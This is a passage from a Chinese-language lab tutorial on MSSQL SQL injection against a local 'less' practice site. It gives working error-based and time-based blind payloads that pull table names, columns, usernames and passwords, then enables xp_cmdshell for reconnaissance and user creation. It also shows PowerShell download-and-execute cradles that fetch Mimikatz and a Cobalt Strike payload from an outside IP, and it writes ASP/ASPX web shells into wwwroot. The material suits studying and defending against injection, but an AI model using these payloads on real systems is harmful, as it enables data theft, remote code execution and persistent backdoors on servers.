&#x27;uagents&#x27; 转换成数据类型 int 时失败</span><br><span class="line"></span><br><span class="line">同样可以通过xpath 获取所有的数据表</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select  name from sysobjects  for xml path) --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h3><p>获取列名之前首先需要在sysobjects中获取对应数据表的ID值，然后根据ID值在syscolumns表中进行查询！</p>
+<p>sql语句如下:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;))</span><br><span class="line"><span class="meta">#</span><span class="bash">假设已知数据表名为users时查询数据表中的所有的字段</span></span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;)) --+</span><br><span class="line"><span class="meta">#</span><span class="bash">返回值</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;id&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">获取第二个</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;)and name!=&#x27;id&#x27;) --+</span><br><span class="line"><span class="meta">#</span><span class="bash">返回值</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;username&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">获取所有的列</span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;)for xml path) --+</span><br><span class="line"></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 nvarchar 值 &#x27;idusernamepassword&#x27; 转换成数据类型 int 时失败。</span><br><span class="line"></span><br><span class="line">在源码中可以看到分开的数据列名</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">直接通过select读取数据</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-1.asp?id=1%27%20 and 1=(select top 1 username from users)--+</span><br><span class="line"><span class="meta">#</span><span class="bash">返回值</span></span><br><span class="line">[Microsoft][ODBC SQL Server Driver][SQL Server]在将 varchar 值 &#x27;Dumb&#x27; 转换成数据类型 int 时失败。</span><br><span class="line">其他读取值和上面类似</span><br></pre></td></tr></table></figure>
+
+<h3 id="实战靶场"><a href="#实战靶场" class="headerlink" title="实战靶场"></a>实战靶场</h3><p>1.判断是否是注入点</p>
+<p>使用 ‘   and 1=1   and 1=2进行判断</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.147.161/less-2.asp?id=1&#39;">http://192.168.147.161/less-2.asp?id=1&#39;</a>   报错</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.147.161/less-2.asp?id=1">http://192.168.147.161/less-2.asp?id=1</a>  and 1=1 正常</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.147.161/less-2.asp?id=1">http://192.168.147.161/less-2.asp?id=1</a> and 1=2 正常</p>
+<p>2.判断列数</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.147.161/less-2.asp?id=1">http://192.168.147.161/less-2.asp?id=1</a> order by 4  显示错误</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.147.161/less-2.asp?id=1">http://192.168.147.161/less-2.asp?id=1</a> order by 3  显示成功</p>
+<p>证明存在3列</p>
+<p>3.判断回显位</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.147.161/less-2.asp?id=0">http://192.168.147.161/less-2.asp?id=0</a> union all select 1,2,3</p>
+<p><img src="image-20210902174400099.png" alt="image-20210902174400099"></p>
+<p>说明回显位是2和3的位置</p>
+<p>4.查询基础信息</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db_name() 数据库名</span><br><span class="line">@<span class="variable">@version</span>  版本信息</span><br><span class="line"><span class="keyword">user</span>,<span class="built_in">system_user</span>,<span class="built_in">current_user</span>,user_name	–<span class="operator">-</span> 获取当前⽤户名</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://192.168.147.161/less-2.asp?id=0">http://192.168.147.161/less-2.asp?id=0</a> union all select 1,@@version,db_name()</p>
+<p><img src="image-20210902174657482.png" alt="image-20210902174657482"></p>
+<p>5.查询数据表名</p>
+<p>mssql数据库中存在information_schema.schemat表，但是每个不同的数据库下存在information_schema.schemat表 ，所以在使用时需要指定特定的数据库！</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select top 1 table_name from test.information_schema.tables)</span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;U&#x27;)</span><br><span class="line"><span class="meta">#</span><span class="bash">获取所有的表</span></span><br><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select  table_name from test.information_schema.tables for xml path(&#x27;&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210902180434689.png" alt="image-20210902180434689"></p>
+<p><img src="image-20210902180824431.png" alt="image-20210902180824431"></p>
+<p>6.查询所有的列</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select   top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;users&#x27;))</span><br><span class="line">读取users表中的第一个name的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select  name from syscolumns where id=(select id from sysobjects where name=(select top 1 name from sysobjects where xtype=&#x27;U&#x27;)) for xml path)</span><br></pre></td></tr></table></figure>
+
+<p>7.读取数据</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.147.161/less-2.asp?id=1 and 1=(select  id,username,password from test..users  for xml path)</span><br><span class="line"></span><br><span class="line">读取users表下的id，username，password字段的所有的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://192.168.147.161/less-2.asp?id=-1 union all select 1,username,password from users where id=3</span><br><span class="line"></span><br><span class="line">读取ID为3的users表下的username，passoword字段！</span><br></pre></td></tr></table></figure>
+
+<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>时间盲注是基于响应包的延时时间进行判断，在mssql中延时函数可以使用<strong>WAITFOR DELAY ‘0:0:n’</strong>  对响应时间进行判断。但是单独使用该语句好像并没有什么作用，那么我们结合if语句可以实现通过延时时间的长短来判断if语句是否成立，从而达到时间盲注的效果，语法如下：</p>
+<p>if exists( ) WAITFOR DELAY ‘0:0:n’</p>
+<p>下面开始盲注学习</p>
+<h4 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h4><p>通过WAITFOR DELAY ‘0:0:n’ 语句根据延时时间的长短来判断是否存在注入点</p>
+<p>正常sql语句如下：</p>
+<p>select username from test..users where id=1   </p>
+<p>当我们尝试使用 延时注入判断是否存在注入点时</p>
+<p>select username from test..users where id=1 waitfor delay ‘0:0:2’   这样id=1的条件是存在的，那么响应时间就会大于2秒钟，那么基本可以判断存在注入点！</p>
+<h3 id="猜测数据库"><a href="#猜测数据库" class="headerlink" title="猜测数据库"></a>猜测数据库</h3><p>猜测数据库时可以通过前面说到的if语句配合延时进行注入查询</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> if(exists(select name from master..sysdatabases where dbid=5))waitfor delay &#x27;0:0:2&#x27;</span><br><span class="line"> </span><br><span class="line">通过查询master.dbo.sysdatabases表中的用户表dbid的值大于五是否存在来判断是否存在用户表（当dbid&gt;4时的表都是用户表）,如果成功延时，则证明存在用户表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="猜测数据库长度"><a href="#猜测数据库长度" class="headerlink" title="猜测数据库长度"></a>猜测数据库长度</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ((select count(*) from master.dbo.sysdatabases where dbid=5 and len(name)=12)=1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"></span><br><span class="line">通过前面的判断我们知道用户表已存在，那么我们可以添加对表name字段长度的判断进行锁定数据表的长度， 可以发现当表长度为12时，成功触发延时条件。</span><br></pre></td></tr></table></figure>
+
+<h4 id="猜测数据库名"><a href="#猜测数据库名" class="headerlink" title="猜测数据库名"></a>猜测数据库名</h4><p>猜测数据库名和猜测数据库长度差不多，这里用到了两个函数  一个是ascii() 用于将字符转化为ascii值, 另外一个是 substring() 这个函数用于截取字符串，因为我们盲注时猜字符串是单个字符进行拆解。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=8 ),1,1))=116) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"></span><br><span class="line">通过不断替换 116的值，只到执行了延时效果时，证明该字符为正确的</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">猜解第二个数据</span></span><br><span class="line">if (ascii(substring((select top 1 name from master.dbo.sysdatabases where dbid=8 ),2,1))=101) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">依次类推，不断的改变截取不同位置的字符，达到对数据库名的猜解为test</span><br></pre></td></tr></table></figure>
+
+<h4 id="猜测表名长度"><a href="#猜测表名长度" class="headerlink" title="猜测表名长度"></a>猜测表名长度</h4><p>猜测表名可以在test..sysobjects表中进行查询，猜解的方式和数据库类似</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((select count(*) from test..sysobjects where xtype=&#x27;U&#x27; and len(name)=5)=1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">当长度为5时，延时成功，证明表长度为5</span><br></pre></td></tr></table></figure>
+
+<h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">猜解第一个字符为e</span></span><br><span class="line">if((select count(*) from test..sysobjects where name in (select top 1 name from test..sysobjects where xtype=&#x27;U&#x27;)and ascii(substring(name,1,1))=101) =1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"><span class="meta">#</span><span class="bash">猜解第二个字符为m</span></span><br><span class="line">if((select count(*) from test..sysobjects where name in (select top 1 name from test..sysobjects where xtype=&#x27;U&#x27;)and ascii(substring(name,2,1))=109) =1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">依次类推可以获取所有的数据</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">通过添加name!=<span class="string">&quot;前一个表表名&quot;</span></span> </span><br><span class="line">if((select count(*) from test..sysobjects where name in (select top 1 name from test..sysobjects where xtype=&#x27;U&#x27; and name!=&#x27;emails&#x27;)and ascii(substring(name,1,1))=117) =1) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">通过该条件获取下面的表的表名</span><br></pre></td></tr></table></figure>
+
+<h4 id="猜解列名长度"><a href="#猜解列名长度" class="headerlink" title="猜解列名长度"></a>猜解列名长度</h4><p>猜解列名是通过syscolumns表进行查询获取，已知表名是users</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">猜表的第一列的第一个字符</span></span><br><span class="line">if(exists(select top 1 name  from test..syscolumns where id=(select  top 1  id from test..sysobjects where name=&#x27;users&#x27;) and ascii(substring(name,1,1))=117)) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">猜第二个字符</span></span><br><span class="line">if(exists(select top 1 name  from test..syscolumns where id=(select  top 1  id from test..sysobjects where name=&#x27;users&#x27;) and ascii(substring(name,2,1))=115)) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"></span><br><span class="line">以此类推获取第一条数据的所有字段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二种方式：</span><br><span class="line">if(ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)),1,1))=105) waitfor delay &#x27;0:0:3&#x27; </span><br><span class="line">换种语法而已</span><br><span class="line">获取第二个字符</span><br><span class="line">if(ascii(substring((select top 1 name from syscolumns where id=(select id from sysobjects where xtype=&#x27;U&#x27; and name=&#x27;users&#x27;)),2,1))=105) waitfor delay &#x27;0:0:3&#x27; </span><br></pre></td></tr></table></figure>
+
+<h4 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h4><p>假设我们已经知道了数据表是users，字段是username,password</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substring((select top 1 username from users),1,1))=68) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line"><span class="meta">#</span><span class="bash">第二个字符数据</span></span><br><span class="line">if(ascii(substring((select top 1 username from users),2,1))=117) waitfor delay &#x27;0:0:3&#x27; --+</span><br><span class="line">依次获取其他字符</span><br></pre></td></tr></table></figure>
+
+<p>至此盲注的所有语法记录完毕</p>
+<h2 id="MSSQL-存储过程"><a href="#MSSQL-存储过程" class="headerlink" title="MSSQL 存储过程"></a>MSSQL 存储过程</h2><h3 id="XP-cmdshell-存储过程"><a href="#XP-cmdshell-存储过程" class="headerlink" title="XP_cmdshell 存储过程"></a>XP_cmdshell 存储过程</h3><p>xp_cmdshell是最常见的mssql getshell的方式之一，该存储过程中包含了可以操作系统的许多指令，可以直接使用系统命令进行操作，非常的方便！</p>
+<h4 id="检查xp-cmdshell是否存在"><a href="#检查xp-cmdshell是否存在" class="headerlink" title="检查xp_cmdshell是否存在"></a>检查xp_cmdshell是否存在</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br><span class="line">当查询到具体信息时，代表该存储过程存在！</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210910152718893.png" alt="image-20210910152718893"></p>
+<h4 id="删除xp-cmdshell"><a href="#删除xp-cmdshell" class="headerlink" title="删除xp_cmdshell"></a>删除xp_cmdshell</h4><p>注意：在 SQL Server 2008 和 SQL Server 2005 中，<strong>sp_dropextendedproc</strong> 不会删除系统扩展存储过程。但系统管理员应拒绝 <strong>public</strong> 角色对扩展存储过程的 EXECUTE 权限。在 SQL Server 2000 中，<strong>sp_dropextendedproc</strong> 可用于删除任何扩展存储过程。</p>
+<p>删除语句：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop procedure sp_addextendedproc </span><br><span class="line">drop procedure sp_oacreate </span><br><span class="line">exec sp_dropextendedproc &#x27;xp_cmdshell&#x27; </span><br></pre></td></tr></table></figure>
+
+<p>由于笔者所在环境是server 2008，所以以上步骤没有成功复现，下面是删除失败的截图</p>
+<p><img src="image-20210910155104565.png" alt="image-20210910155104565"></p>
+<h4 id="恢复xp-cmdshell"><a href="#恢复xp-cmdshell" class="headerlink" title="恢复xp_cmdshell"></a>恢复xp_cmdshell</h4><p>在上一步中如果xp_cmdshell被删除，或者无法正常的使用时（先删除xp_cmdshell），可以通过恢复的方式来重装xp_cmdshell</p>
+<p>1.无法定位到存储过程xp_cmdshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)</span><br><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot; &quot;)</span><br></pre></td></tr></table></figure>
+
+<p>直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>同样在 sql server 2008中该语法会发生错误！</p>
+<p>判断敏感的存储过程，不存在的话直接恢复</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_cmdshell]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_cmdshell&#x27;,&#x27;xplog70.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_dirtree]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_dirtree&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_fixeddrives]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_fixeddrives&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regwrite]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_regwrite&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regread]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_regread&#x27;,&#x27;xpstar.dll&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="开启xp-cmdshell"><a href="#开启xp-cmdshell" class="headerlink" title="开启xp_cmdshell"></a>开启xp_cmdshell</h4><p>在sql server2008中xp_cmdshell可能无法删除，但是我们可以将xp_cmdshell关闭，阻止执行系统命令，同时我们可以通过一些命令来开启选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE; exec SP_CONFIGURE &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210910161517700.png" alt="image-20210910161517700"></p>
+<p>然后运行 <strong>exec xp_cmdshell “net user”</strong> 查看是否能够正常的使用</p>
+<p><img src="image-20210910161605286.png" alt="image-20210910161605286"></p>
+<h4 id="关闭xp-cmdshell存储过程"><a href="#关闭xp-cmdshell存储过程" class="headerlink" title="关闭xp_cmdshell存储过程"></a>关闭xp_cmdshell存储过程</h4><p>xp_cmdshell的关闭也很简单，使用以下命令就可以关系</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>下面附一些常见的xp_cmdshell收集信息的指令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &quot;whoami&quot;;   获取用户信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;ipconfig/all&#x27;  获取网卡信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#x27;</span><br><span class="line">exec master..xp_cmdshell &#x27;systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;&#x27;   获取操作系统和版本信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;wmic cpu get name,NumberOfCores,NumberOfLogicalProcessors/Format:List&#x27; 通过wmic获取系统信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber&#x27;  获取3389端口开启信息</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;Net user testuser1 passwd1 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add&#x27;,NO_OUTPUT  添加用户</span><br><span class="line"></span><br><span class="line">exec master.dbo.xp_cmdshell &#x27;taskkill /f /im taskmgr.exe&#x27;; 删除任务管理器</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &#x27;mkdir &quot;C:\test\&quot; &#x27;  创建文件</span><br><span class="line"></span><br><span class="line">常用：</span><br><span class="line">xp_cmdshell 调用powershell 下载文件</span><br><span class="line">exec xp_cmdshell &#x27;powershell -c &quot;iex((new-object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&quot;))&quot;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="xp-cmdshell-查找文件"><a href="#xp-cmdshell-查找文件" class="headerlink" title="xp_cmdshell 查找文件"></a>xp_cmdshell 查找文件</h4><p>我们可以利用该存储过程获取系统中的文件目录，也可以通过指令来查找特定的文件，达到信息收集的作用。</p>
+<p>在dos命令行中我们可以通过for循环遍历查找我们想要的文件，格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for /r c:\ %i in (1*.aspx) do @echo %i</span><br><span class="line"></span><br><span class="line">for语句解读</span><br><span class="line">/r   查找指定目录下的所有的文件</span><br><span class="line">/d   查找指定目录下的所有的文件夹</span><br><span class="line">/f   读取指定文件的文件内容</span><br><span class="line">（1*.aspx） 是查找的文件条件</span><br><span class="line">do  后的语句为前面条件成功后需要执行的命令</span><br></pre></td></tr></table></figure>
+
+<p>那么 我们了解基础的使用方式后，就可以通过xp_cmdshell来执行该语句</p>
+<p>以查找我们网站目录下的的sql.aspx文件为例</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_cmdshell &#x27;for /r c:\ %i in (sq*.asp) do @echo %i&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line">c:\inetpub\wwwroot\sql.aspx</span><br><span class="line"></span><br><span class="line">这样我们就可以查找到网站的绝对路径了，如果我们无法获取回显内容，那么我们可以折中通过</span><br><span class="line">创建表的方式来插入检索内容到表中，在通过sql注入漏洞来获取需要的内容</span><br><span class="line"></span><br><span class="line">http://10.88.14.61/less-1.asp?id=1&#x27; create table temp(dir varchar(1000)) --+   创建表</span><br><span class="line"></span><br><span class="line">http://10.88.14.61/less-2.asp?id=1&#x27; ;insert into temp(dir) exec master..xp_cmdshell &#x27;for /r c:\ %25i in (sq*.aspx) do @echo %25i&#x27; --+  插入数据</span><br><span class="line">然后执行 select * from test..temp 即可查询到所需的数据</span><br></pre></td></tr></table></figure>
+
+<h4 id="xp-cmdshell-getshell"><a href="#xp-cmdshell-getshell" class="headerlink" title="xp_cmdshell getshell"></a>xp_cmdshell getshell</h4><p>xp_cmdshell  执行命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &quot;whoami&quot;</span><br><span class="line">exec master.dbo.xp_cmdshell &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210913162933012.png" alt="image-20210913162933012"></p>
+<h5 id="Powershell-获取权限"><a href="#Powershell-获取权限" class="headerlink" title="Powershell 获取权限"></a>Powershell 获取权限</h5><p>1.使用cs生成powershell 木马文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://121.4.48.72:33898/payload&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210913163322208.png" alt="image-20210913163322208"></p>
+<p>2使用xp_cmdshell 执行powershell命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://10.88.14.61/less-1.asp?id=1&#x27;;exec xp_cmdshell &quot;powershell.exe -nop -w hidden -c (IEX ((new-object net.webclient).downloadstring(&#x27;http://121.4.48.72:33898/payload&#x27;)))&quot;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>cs上成功上线！</p>
+<p><img src="image-20210913164923243.png" alt="image-20210913164923243"></p>
+<h5 id="写入木马获取权限"><a href="#写入木马获取权限" class="headerlink" title="写入木马获取权限"></a>写入木马获取权限</h5><p>假设已知目标网站绝对路径为<strong>C:\inetpub\wwwroot</strong> 直接使用xp_cmdshell写入文件到该目录下，前提是该目录要有写入权限，注意在url中输入时需要对%进行url编码，否则生成的小马%会被吃掉，导致写入shell失败！以asp小马为例</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.88.14.61/less-1.asp?id=1&#x27;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; C:\inetpub\wwwroot\404.aspx&#x27; ;--+</span><br><span class="line">asp 小马</span><br><span class="line">http://10.88.14.61/less-1.asp?id=1&#x27;exec master..xp_cmdshell &#x27;echo ^&lt;%25eval request(&quot;chopper&quot;)%25^&gt; &gt; C:\inetpub\wwwroot\405.asp&#x27; ;--+</span><br></pre></td></tr></table></figure>
